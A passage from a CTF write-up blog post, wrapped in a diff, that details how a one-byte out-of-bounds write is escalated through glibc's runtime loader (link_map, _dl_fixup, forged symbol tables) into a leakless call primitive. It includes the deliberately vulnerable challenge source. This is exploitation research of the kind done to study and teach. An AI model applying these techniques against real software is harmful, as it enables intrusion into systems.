@@ -1,0 +1,891 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>the pepsi place | Nightmare: Novel Exploitation Tactics With One Byte Write.</title>
+  <meta name="description" content="Go from one byte out-of-bounds write to a complete ROP chain without IO access and no brute force under extremely restrictive seccomp, without *ever* knowing ASLR base.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Nightmare: Novel Exploitation Tactics With One Byte Write.">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://blog.pepsipu.com/posts/nightmare">
+  <meta property="og:description" content="Go from one byte out-of-bounds write to a complete ROP chain without IO access and no brute force under extremely restrictive seccomp, without *ever* knowing ASLR base.">
+  <meta property="og:site_name" content="the pepsi place">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://blog.pepsipu.com/posts/nightmare">
+  <meta name="twitter:title" content="Nightmare: Novel Exploitation Tactics With One Byte Write.">
+  <meta name="twitter:description" content="Go from one byte out-of-bounds write to a complete ROP chain without IO access and no brute force under extremely restrictive seccomp, without *ever* knowing ASLR base.">
+
+  
+    <meta property="og:image" content="https://blog.pepsipu.com/assets/og-image-04fbfc4e15efb2f7c4cde09b072db471162ce6a646dd0d04e1f19eec72491c9b.jpg">
+    <meta name="twitter:image" content="https://blog.pepsipu.com/assets/og-image-04fbfc4e15efb2f7c4cde09b072db471162ce6a646dd0d04e1f19eec72491c9b.jpg">
+  
+
+  <link href="https://blog.pepsipu.com/feed.xml" type="application/rss+xml" rel="alternate" title="the pepsi place Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-dark-11327753546b2135c989eee5cd83497a2734b702928d016839d795f6c706e3d5.ico">
+      <link rel="apple-touch-icon" href="/assets/apple-touch-icon-dark-d161409442b7e523089f24d08d0a55951549ece7504207c376d53b020713494d.png">
+      <link rel="stylesheet" type="text/css" href="/assets/dark-831218bc9e41aef39ee6a0bae4501195bccafcc13101ae2b9cd20493a6ec04c0.css">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="the pepsi place">the pepsi place</a>
+  <ul class="header-links">
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/pepsipu" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://instagram.com/sam.hajhamid" rel="noreferrer noopener" target="_blank" title="Instagram">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-instagram">
+  <use href="/assets/instagram-37f85bc75b43ecc4c114d9a46f846327fe13c5893787c6afbcfef9d30d58bd9e.svg#icon-instagram" xlink:href="/assets/instagram-37f85bc75b43ecc4c114d9a46f846327fe13c5893787c6afbcfef9d30d58bd9e.svg#icon-instagram"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:pepsipu@pepsipu.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="/feed.xml" rel="noreferrer noopener" target="_blank" title="RSS">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-rss">
+  <use href="/assets/rss-541ec5cea9cefd10d2fcfec01888f3f231a8829940249835fa7b7b3a12ae0d0d.svg#icon-rss" xlink:href="/assets/rss-541ec5cea9cefd10d2fcfec01888f3f231a8829940249835fa7b7b3a12ae0d0d.svg#icon-rss"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+  </ul>
+</nav>
+
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Nightmare: Novel Exploitation Tactics With One Byte Write.</h1>
+            <p>Go from one byte out-of-bounds write to a complete ROP chain without IO access and no brute force under extremely restrictive seccomp, without *ever* knowing ASLR base.</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    February 2, 2022
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/ctf" title="See all posts with tag 'ctf'">ctf</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <h2 id="introduction">Introduction</h2>
+<p>Attacks on the GNU C library have been wide and thorough. Many of the complex surfaces in the library, such as <code class="highlighter-rouge">malloc</code> or IO, have been thoroughly deconstructed and analyzed to be utilized in exploit chains. However, one surface, the runtime loader, is yet to be brought into its full potential. <code class="highlighter-rouge">rtld</code>, as it’s called, is rich with complexity and interesting gadgets for a variety of reasons.</p>
+
+<h3 id="background">Background</h3>
+<p>Let’s go a little more in-depth on <code class="highlighter-rouge">rtld</code>. First, the runtime loader is provided by a shared library named <code class="highlighter-rouge">ld.so</code> bundled alongside <code class="highlighter-rouge">libc.so</code>. If you’ve ever seen a virtual memory map of a process, it’s almost certain you’ll see both <code class="highlighter-rouge">ld.so</code> and <code class="highlighter-rouge">libc.so</code> in there <em>somewhere</em>. The ubiquity of both makes them very valuable targets for exploitation.</p>
+
+<p>Another neat fact is <code class="highlighter-rouge">libc.so</code> and <code class="highlighter-rouge">ld.so</code> are <em>consistently spaced</em> in memory. They’ll be at consistent offsets from each other! This is a byproduct of something known as <code class="highlighter-rouge">mmap</code> relativity, where pages allocated by <code class="highlighter-rouge">mmap</code> are usually adjacent, and if not, always at a relative offset. This will be useful later.</p>
+
+<p>We’ve seen some eyes on <code class="highlighter-rouge">rtld</code> though! Take a look at <a href="https://hxp.io/blog/92/hxp-CTF-2021-zehn-writeup/">zehn</a> from hxpCTF 2021. Given the ability to write bytes into <code class="highlighter-rouge">mmap</code> relative space, such as where <code class="highlighter-rouge">ld.so</code> and <code class="highlighter-rouge">libc.so</code> is loaded, hxp showcases the implementation of a call function primitive using 12 bits of brute force. Another usage of <code class="highlighter-rouge">rtld</code> is in <code class="highlighter-rouge">ret2dlresolve</code>, an exploit strategy where libc functions such as <code class="highlighter-rouge">system</code> can be called by building a ROP chain using only binary space addresses.</p>
+
+<h3 id="challenge">Challenge</h3>
+
+<p>It’s worth noting that nightmare as a challenge is contrived. There are several arbitrary restrictions imposed to force competitors to build more powerful primitives under extremely high constraints.</p>
+
+<p>These restrictions include:</p>
+<ul>
+  <li>Seccomp with open/read/write/mmap to prevent shell/shellcode.</li>
+  <li>Closed IO to prevent leaking mmap base.</li>
+  <li>Static payload run against 8 different challenge instances to prevent brute force.</li>
+</ul>
+
+<p>This sets the competitors’ sights on building a ROP chain completely blind.</p>
+<h3 id="impact">Impact</h3>
+<p>The solution to nightmare introduces a variety of primitives that, until now, were inaccessible through libc as well as some novel exploit strategies by binding together attacks on the runtime loader, <code class="highlighter-rouge">malloc</code>, and IO objects to ultimately craft and execute an arbitrary ROP chain without ever knowing ASLR base. All that is required is a single byte write into <code class="highlighter-rouge">mmap</code> relative space.</p>
+
+<p>It is unlikely such an exploit will be useful outside of CTF given the abundance of primitives in real targets. All steps are reproducible on the latest GLIBC version, 3.34 as of date.</p>
+
+<h2 id="first-steps">First Steps</h2>
+
+<p>First, we should probably take a look at the source code.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kt">void</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="n">nightmare</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">chunk</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">chunk</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x40000</span><span class="p">);</span>
+        <span class="n">seccomp</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="kt">uint8_t</span> <span class="n">byte</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">size_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">offset</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">size_t</span><span class="p">));</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">byte</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint8_t</span><span class="p">));</span>
+
+    <span class="n">chunk</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span> <span class="o">=</span> <span class="n">byte</span><span class="p">;</span>
+
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"BORN TO WRITE WORLD IS A CHUNK 鬼神 LSB Em All 1972 I am mov man 410,757,864,530 CORRUPTED POINTERS"</span><span class="p">,</span> <span class="mi">101</span><span class="p">);</span>
+    <span class="n">_Exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">_Exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Although this <code class="highlighter-rouge">__attribute__((constructor))</code> tag looks a little intimidating, a quick view at the docs tells us that code marked as a “constructor” will run before <code class="highlighter-rouge">main</code>.</p>
+
+<p>Further looking at the program, we see it allocates a chunk with <code class="highlighter-rouge">malloc</code>, then reads an offset and a byte from the user. It’ll then write that byte at the supplied offset from the allocated chunk. Then, it quits with exit, but printing a friendly little message before quitting.</p>
+
+<p>Notice the size of the allocation. Knowing <code class="highlighter-rouge">malloc</code> uses <code class="highlighter-rouge">mmap</code> for larger chunks, rather than servicing the request on the heap, we know we can write this byte anywhere to <code class="highlighter-rouge">mmap</code> relative memory! Remember our laws of <code class="highlighter-rouge">mmap</code>, that all <code class="highlighter-rouge">mmap</code> pages are adjacent or, at the least, consistently spaced.</p>
+
+<p>So, our primitive is one byte write in <code class="highlighter-rouge">mmap</code> space. Well, where do we put it?</p>
+
+<h3 id="preliminary-analysis">Preliminary Analysis</h3>
+<p>First, it’s important to note that it is simply <em>impossible</em> for one byte to encode “build me an arbitrary ROP chain” with only a measly 8 bits of entropy. Rather, we should shift our focus to obtaining more byte writes instead and worry about what to do from there later.</p>
+
+<p>Notice the order of the functions in the binary.</p>
+<ul>
+  <li><code class="highlighter-rouge">nightmare</code></li>
+  <li><code class="highlighter-rouge">main</code></li>
+  <li><code class="highlighter-rouge">__libc_csu_init</code>, which, if you read the documentation about constructors, calls <code class="highlighter-rouge">nightmare</code>.</li>
+</ul>
+
+<h4 id="gcc-optimization-nightmare">GCC Optimization Nightmare</h4>
+<p>The attribute <code class="highlighter-rouge">noreturn</code> is applied to functions that, well, don’t return. <code class="highlighter-rouge">_Exit</code> is one of these functions. It has two main effects:</p>
+<ul>
+  <li>A <code class="highlighter-rouge">ret</code> instruction is not inserted at the end of the function body.</li>
+  <li>It has a “cascading” property, where if a <code class="highlighter-rouge">noreturn</code> function is called at the end of another function, that function will also be marked as <code class="highlighter-rouge">noreturn</code>.</li>
+</ul>
+
+<p>So, GCC will optimize <code class="highlighter-rouge">nightmare</code> and <code class="highlighter-rouge">main</code> as <code class="highlighter-rouge">noreturn</code> and they won’t have return instructions after their calls to <code class="highlighter-rouge">_Exit</code>. Normally, this works out just fine since <code class="highlighter-rouge">_Exit</code> truly never returns.</p>
+
+<p>However, if it did, we would slide into <code class="highlighter-rouge">main</code> after <code class="highlighter-rouge">nightmare</code> finishes and then slide into <code class="highlighter-rouge">__libc_csu_init</code> after <code class="highlighter-rouge">main</code> finishes, which after calling <code class="highlighter-rouge">nightmare</code> would then infinitely loop this process. That’ll give us infinite byte writes!</p>
+
+<p>We’ve now reduced our goal from “loop the program” to “force <code class="highlighter-rouge">_Exit</code> to return”. To do this, we’ll need to build some primitives by exploiting our complex surfaces.</p>
+
+<h3 id="complex-surface-inventory">Complex Surface Inventory</h3>
+<p>Now, let’s take inventory of our complex surfaces. After our write, we have two function calls, <code class="highlighter-rouge">write</code> and <code class="highlighter-rouge">_Exit</code>. Let’s check the source code for both to see what we can exploit.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// _Exit is aliased to _exit</span>
+<span class="kt">void</span> <span class="nf">_exit</span> <span class="p">(</span><span class="kt">int</span> <span class="n">status</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">INLINE_SYSCALL</span> <span class="p">(</span><span class="n">exit_group</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">status</span><span class="p">);</span>
+      <span class="n">INLINE_SYSCALL</span> <span class="p">(</span><span class="n">exit</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">status</span><span class="p">);</span>
+      <span class="n">ABORT_INSTRUCTION</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">ssize_t</span> <span class="nf">__libc_write</span> <span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">nbytes</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">return</span> <span class="n">SYSCALL_CANCEL</span> <span class="p">(</span><span class="n">write</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">nbytes</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Oh no! Both of these functions don’t even reference writable memory! They’re just thin wrappers over their associated system calls. Clearly, we cannot attack either with our one-byte write. So, what do we do?</p>
+
+<p>We’ll need to dig deeper to find the complex surface out of sight. A <code class="highlighter-rouge">checksec</code> of the binary will cause the surface to reveal itself:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      PIE enabled
+</code></pre></div></div>
+<p>Partial RELRO! If you’ve done CTF in the past, maybe you’ll know that with partial RELRO, imported symbols from libraries will be written to the GOT, which is marked as <em>writeable</em>. This is because, with partial RELRO, symbols are loaded “lazily”, requesting each import only as it’s needed. Once the import is done, it’ll write the resulting address to the GOT so it doesn’t need to be loaded on the next call. That’s why the GOT is writable here.</p>
+
+<p>Notice that both <code class="highlighter-rouge">exit</code> and <code class="highlighter-rouge">write</code> will be imported after the write thanks to lazy loading. However, to most people, the process of importing symbols from another library is a mystery, a mystery whose answers are shrouded deep within the runtime loader.</p>
+
+<h2 id="exploiting-runtime-resolution-of-symbols">Exploiting Runtime Resolution of Symbols</h2>
+<p>To no one’s surprise, resolving symbols is a complicated process. That’s a good thing since now we have a complex surface to target!</p>
+
+<h3 id="understanding-lazy-symbol-loading-with-partial-relro">Understanding Lazy Symbol Loading with Partial RELRO</h3>
+<p>Let’s discuss the exact process of resolving a symbol.</p>
+
+<p>When the binary calls <code class="highlighter-rouge">write</code>, the actual call under the hood is to <code class="highlighter-rouge">write@plt</code>, which is just a thin wrapper for calling the address in <code class="highlighter-rouge">write@got</code>. Simple so far! When the binary is loaded, each symbol in the GOT simply contains<code class="highlighter-rouge">symbol@plt+6</code>, including <code class="highlighter-rouge">write</code>. <code class="highlighter-rouge">write@plt+6</code>’s job is to swap out <code class="highlighter-rouge">write@got</code> with the location of <code class="highlighter-rouge">write</code> in the C library.</p>
+
+<p>To most programmers, your exploration stops there. It’s none of your business to know what happens in<code class="highlighter-rouge">write@plt+6</code>.</p>
+
+<p>However, we must know! We’re attacking the runtime loader after all. Let’s take a look at the disassembly.</p>
+
+<p><img src="https://i.imgur.com/6abk6kJ.png" alt="" /></p>
+
+<p>For comparison, here’s <code class="highlighter-rouge">_Exit@plt+6</code>.</p>
+
+<p><img src="https://i.imgur.com/AEFdKly.png" alt="" /></p>
+
+<p>There are two key pointers at play here. These two referenced pointers, <code class="highlighter-rouge">data_4008</code> and <code class="highlighter-rouge">data_4010</code>, appear right where the global offset table is in memory. There’s also a number associated with each function, 0 for <code class="highlighter-rouge">write</code> and 5 for <code class="highlighter-rouge">_Exit</code>. For simplicity, let’s call this number <code class="highlighter-rouge">plt_idx</code> since it seems to correspond with the order of the PLT functions and GOT entries.</p>
+
+<p>Somehow, <code class="highlighter-rouge">data_4010(data_4008, plt_idx)</code> resolves the location of a symbol.</p>
+
+<p>Let’s take a look at these pointers in a debugger.</p>
+
+<p><img src="https://i.imgur.com/kzGdpDe.png" alt="" /></p>
+
+<p><code class="highlighter-rouge">data_4008</code> contains a weird pointer to an even weirder structure, while <code class="highlighter-rouge">data_4010</code> contains a pointer to the function and well-defined symbol <code class="highlighter-rouge">_dl_runtime_resolve_fxsave</code>.</p>
+
+<p>Some research will tell us that the different “runtime resolve save” functions, as they’re called, provide ABI agnostic wrappers around the function <code class="highlighter-rouge">_dl_fixup</code>.They “save” program state due to ABI uncertainties when calling the foreign function <code class="highlighter-rouge">_dl_fixup</code>. <code class="highlighter-rouge">_dl_fixup</code> does the heavy lifting of resolving the symbol. Here, our runtime loader decides to use <code class="highlighter-rouge">_dl_runtime_resolve_fxsave</code>.</p>
+
+<p>So, our symbol resolver seems to be something like <code class="highlighter-rouge">_dl_fixup(data_4008, plt_idx)</code>.</p>
+
+<h3 id="complexity-in-_dl_fixup">Complexity in <code class="highlighter-rouge">_dl_fixup</code></h3>
+<p><code class="highlighter-rouge">_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)</code> takes two arguments, a “link map” and a “relocation index”.</p>
+
+<p>The “link map”, as it’s called, wraps up all of the relevant information about an ELF into a really neat data structure. It’ll use the link map to figure out what symbol the “relocation index” is referring to, as well as provide a wealth of other needed information to do symbol resolution.</p>
+
+<p>You’re invited to look into the source code for yourself and dig around, but what interested me was the “resolution address” calculation. <code class="highlighter-rouge">_dl_fixup</code> utilizes information stored in the link map to figure out where <code class="highlighter-rouge">symbol@got</code>, called the “resolution address”, is located.</p>
+
+<p>Exploiting this would be valuable as if we trick <code class="highlighter-rouge">_dl_fixup</code> into calculating the wrong resolution address and <code class="highlighter-rouge">write@got</code> remained <code class="highlighter-rouge">write@plt+6</code>, we’d never lose <code class="highlighter-rouge">_dl_fixup</code> as an attack surface after the byte write.</p>
+
+<h2 id="program-looping-with-resolution-address-miscalculation">Program Looping with Resolution Address (Mis)calculation</h2>
+<p>Let’s analyze how the resolution address is calculated in <code class="highlighter-rouge">_dl_fixup</code>.</p>
+
+<p>Here’s the two relevant lines of code. Keep in mind that <code class="highlighter-rouge">l</code> is the link map and <code class="highlighter-rouge">reloc_arg</code> is the relocation index.</p>
+<pre><code class="language-c=">const PLTREL *const reloc = (const void *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset(pltgot, reloc_arg));
+void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);
+</code></pre>
+
+<p>This first line essentially translates to <code class="highlighter-rouge">l-&gt;l_info[DT_JMPREL].d_un.d_ptr[reloc_arg]</code>. That’s a mouthful, so let’s break down each component piece by piece.</p>
+
+<h3 id="dynamic-and-l_info"><code class="highlighter-rouge">.dynamic</code> and <code class="highlighter-rouge">l_info</code></h3>
+<p>When the runtime loader loads an ELF, it locates different data structures, like where destructor functions or the GOT is stored, through entries in the <code class="highlighter-rouge">.dynamic</code> section. Here’s what a <code class="highlighter-rouge">.dynamic</code> section looks like.</p>
+
+<p><img src="https://i.imgur.com/SDcjtrz.png" alt="" /></p>
+
+<p>There are two components to each entry, named an <code class="highlighter-rouge">Elf64_Dyn</code>, a “tag” and a “value”. All the tag does is describe the value, letting the loader what value corresponds to what information about ELF. The runtime loader will read each entry, storing a pointer to each entry in the ELF’s link map.</p>
+
+<p>Specifically, a pointer to each <code class="highlighter-rouge">Elf64_Dyn</code> will be stored in the link map’s <code class="highlighter-rouge">l_info</code> array, indexed by the tag. So, if the loader needed to know where the destructor function is in the binary, it can access the <code class="highlighter-rouge">Elf64_Dyn</code> with <code class="highlighter-rouge">l-&gt;l_info[DT_FINI]</code>.</p>
+
+<p>Getting out the pointer to the destructor function is as simple as accessing the <code class="highlighter-rouge">l-&gt;l_info[DT_FINI].d_un.d_ptr</code>.</p>
+
+<p>Ok, so this <code class="highlighter-rouge">l-&gt;l_info[DT_JMPREL].d_un.d_ptr</code> thing just gives us the location of some table indexed by the relocation index. Each entry has a <code class="highlighter-rouge">r_offset</code> attribute, which specifies where the resolved address of the symbol should be placed.</p>
+
+<p>Since the <code class="highlighter-rouge">r_offset</code> attribute is an offset rather than an absolute pointer, we’ll need to add <code class="highlighter-rouge">l-&gt;l_addr</code> to get the resolution address.</p>
+
+<h3 id="exploiting-page-alignment">Exploiting Page Alignment</h3>
+<p>We’ve got lots of things to overwrite here, but with only one byte to work with, we must be picky.</p>
+
+<p>Since the link map is stored in <code class="highlighter-rouge">ld.so</code>’s memory, it’ll be <code class="highlighter-rouge">mmap</code> relative and reachable by our byte write. First, let’s noticed that the binary is always aligned to a page boundary, since memory permissions can only be applied per page. This means that <code class="highlighter-rouge">l_addr</code> will be aligned to a page boundary, or, in other words, its first 12 least significant bits will be zero.</p>
+
+<p>That’s good! This means, by writing our byte to the LSB of <code class="highlighter-rouge">l_addr</code>, we can add any value from 0 to 255 to our relocation address.</p>
+
+<h3 id="write-write-primitive"><code class="highlighter-rouge">write</code> Write Primitive</h3>
+
+<p>This gives us an interesting write primitive, allowing us to write a pointer to <code class="highlighter-rouge">write</code> anywhere in binary space after <code class="highlighter-rouge">write@got</code>. Of course, the offset is capped at 255.</p>
+
+<p>Remember, the goal is to cancel <code class="highlighter-rouge">_Exit</code> from ever being called. Can our new primitive help here?</p>
+
+<p>What if <code class="highlighter-rouge">write</code> overwrote <code class="highlighter-rouge">_Exit@plt+6</code> at <code class="highlighter-rouge">_Exit@got</code>?</p>
+
+<p>Because system calls like <code class="highlighter-rouge">write</code> fail silently, we can just write <code class="highlighter-rouge">write</code> to <code class="highlighter-rouge">_Exit@got</code>. When we do end up calling <code class="highlighter-rouge">_Exit@got</code>, the arguments won’t match <code class="highlighter-rouge">write</code>, but the function will still return and we won’t crash.</p>
+
+<h2 id="leakless-address-call-primitive-with-symtab-and-strtab-overwrites">Leakless Address Call Primitive with <code class="highlighter-rouge">SYMTAB</code> and <code class="highlighter-rouge">STRTAB</code> Overwrites</h2>
+<p>That was a fun warmup! We’ve learned a lot about link maps and symbol resolution, which will serve us well when we go to more complex exploitation of <code class="highlighter-rouge">_dl_fixup</code> and associated functions.</p>
+
+<p>Now we have infinite byte writes, how are we going to escalate our write primitive to a “call any address” primitive?</p>
+
+<p>Currently, there isn’t a known way to get this primitive through GLIBC without leaking ASLR base, much less through <code class="highlighter-rouge">_dl_fixup</code>. No problem! We’ll just have to make one ourselves.</p>
+
+<h3 id="revisiting-_dl_fixup-to-gain-static-symbol-resolution">Revisiting <code class="highlighter-rouge">_dl_fixup</code> to Gain Static Symbol Resolution</h3>
+
+<p><code class="highlighter-rouge">_dl_fixup</code> is still filled with much untapped complexity to attack. Let’s take a look.</p>
+
+<h4 id="the-power-of-offsets">The Power Of Offsets</h4>
+
+<p>One of the natures of PIE binaries is that they are, by definition, relocatable. As we’ve seen with <code class="highlighter-rouge">r_offset</code>, rather than storing a pointer <code class="highlighter-rouge">X</code> to a resource, the binary stores offset <code class="highlighter-rouge">Y</code> from the start of the binary and retrieves the resource by calculating <code class="highlighter-rouge">l_addr + X</code>.</p>
+
+<p>This offset to pointer behavior seems <em>awfully</em> exploitable. If we can change these offsets, it’s possible to force a resource to be retrieved incorrectly. We can’t write pointers since we don’t know the ASLR base, but we surely can write offsets.</p>
+
+<p>Claiming that no leakless call primitive exists in GLIBC is a bit of a white lie. Offset calculation is the crux of the <a href="https://hackmd.io/jmE0VvcTQaaJm6SEWiqUJA">House of Blindess</a> exploit, which I made not too many months ago attacking <code class="highlighter-rouge">_dl_fini</code>, a function called at the exit of every GLIBC program. The destructor function is calculated as <code class="highlighter-rouge">l_addr + l-&gt;l_info[DT_FINI].d_un.d_ptr</code>, which, with some clever byte writes, can be transformed into any <code class="highlighter-rouge">mmap</code> relative address without a leak.</p>
+
+<p>Such an exploit is likely possible on <code class="highlighter-rouge">_dl_fixup</code> thanks to offsets.</p>
+
+<h3 id="tales-of-_r_debug-and-lsb-overwrites">Tales of <code class="highlighter-rouge">_r_debug</code> and LSB Overwrites</h3>
+<p>If you’ve read the House Of Blindness writeup, you’ll know that we can cause many resources pointed by an <code class="highlighter-rouge">Elf64_Dyn</code> to be read from writeable memory instead of the binary with a least significant byte write.</p>
+
+<p>If not, let me introduce you to <code class="highlighter-rouge">_r_debug</code>.</p>
+
+<p><code class="highlighter-rouge">l_info</code> holds a tightly packed array of pointers to <code class="highlighter-rouge">Elf64_Dyn</code>s located in the <code class="highlighter-rouge">.dynamic</code> section. With a LSB overwrite, we can make one of these pointers point at another <code class="highlighter-rouge">Elf64_Dyn</code>. For example, in the context of this binary, we can cause the <code class="highlighter-rouge">l_info[DT_SYMTAB]</code>, the symbol table <code class="highlighter-rouge">Elf64_Dyn</code>, to point to the string table <code class="highlighter-rouge">Elf64_Dyn</code>, <code class="highlighter-rouge">DT_STRTAB</code>, by overwriting the LSB of  <code class="highlighter-rouge">l_info[DT_SYMTAB]</code> with <code class="highlighter-rouge">0x78</code>.</p>
+
+<p>The real power of this LSB overwrite comes when we force a <code class="highlighter-rouge">l_info</code> entry to point at <code class="highlighter-rouge">DT_DEBUG</code>. This <code class="highlighter-rouge">Elf64_Dyn</code> contains a pointer to debug information, named <code class="highlighter-rouge">_r_debug</code>, stored in <code class="highlighter-rouge">ld.so</code>’s writeable memory. Since this memory is writeable, we can forge any <code class="highlighter-rouge">Elf64_Dyn</code> value we want!</p>
+
+<p>This is especially potent for resolving arbitrary functions, as we can move the string table, <code class="highlighter-rouge">DT_STRTAB</code>, over to <code class="highlighter-rouge">_r_debug</code> and choose what function we’d like to resolve. When <code class="highlighter-rouge">_dl_fixup</code> tries to see what string our resolution index corresponds to, it’ll read an arbitrary string instead of “write”. If we decided to make this arbitrary string “system”, we’d call the system function.</p>
+
+<p>It’s worth noting this is <em>not</em> an arbitrary address call, it only allows us to call any well-defined symbol in the global scope. It also <em>certainly</em> will not allow us to craft an arbitrary ROP chain, so we’ve still got much work ahead of us.</p>
+
+<h2 id="forging-fake-symbol-tables">Forging Fake Symbol Tables</h2>
+
+<p>Let’s say I move over string table to writeable memory and the binary reads the string <code class="highlighter-rouge">_dl_x86_get_cpu_features</code>, a function from <code class="highlighter-rouge">ld.so</code>, instead of <code class="highlighter-rouge">write</code>. What happens?</p>
+
+<p>Well, how does <code class="highlighter-rouge">_dl_fixup</code> know where <code class="highlighter-rouge">_dl_x86_get_cpu_features</code> is located in its memory? Its symbol table, of course! It should then follow that, if we can also move <code class="highlighter-rouge">ld.so</code>’s symbol table to writeable memory by modifying its link map, we should be able to forge what <code class="highlighter-rouge">_dl_x86_get_cpu_features</code> resolves to!</p>
+
+<p>Unfortunately, <code class="highlighter-rouge">ld.so</code> does not have a reference to <code class="highlighter-rouge">_r_debug</code> in its <code class="highlighter-rouge">.dynamic</code> section. However, there is one to the global offset table. Since the symbol table is so big and the global offset table is adjacent to the <code class="highlighter-rouge">.bss</code> section, the entry associated with <code class="highlighter-rouge">_dl_x86_get_cpu_features</code> will be in writeable memory.</p>
+
+<p>These two modified link maps may sound a bit confusing, so here’s a diagram.</p>
+
+<p><img src="https://i.imgur.com/IteAsGa.png" alt="" /></p>
+
+<p>Entries in the symbol table, or <code class="highlighter-rouge">Elf64_Sym</code>, specifies the offset from the start of the binary in its <code class="highlighter-rouge">st_value</code> field. We can just copy all the other values of the original <code class="highlighter-rouge">Elf64_Sym</code> associated with <code class="highlighter-rouge">_dl_x86_get_cpu_features</code>, except, we set the offset to whatever we want. This offset will be added to <code class="highlighter-rouge">ld.so</code>’s <code class="highlighter-rouge">l_addr</code>, allowing us to call any arbitrary address!</p>
+
+<h4 id="caveat-versioning-info">Caveat: Versioning Info</h4>
+<p>Technically, this isn’t going to work without a moderate amount of fixes. I’ll gloss over the minor ones, but the most important one is “versioning”.</p>
+
+<p>Modern binaries utilize versioning to specify which libraries they will import symbols from. A pointer to the “scope”, as it’s called, is stored in the link map’s version field. Older binaries have this set to null, so we’ll need to null it out to utilize the global scope instead of a restricted one.</p>
+
+<p>This isn’t as simple as it sounds because we can only write byte by byte, so in the process of nulling out version info we’d end up referencing it. This can be fixed by temporarily disabling references to the version by utilizing “local” symbols, but this post is already way too long so I’ll leave it to you to check the solve script if you’re interested.</p>
+
+<h3 id="a-better-call-primitive">A Better Call Primitive</h3>
+<p>This call primitive is subpar at best. Unfortunately, it gives us no argument control, so we’ll need a better one.</p>
+
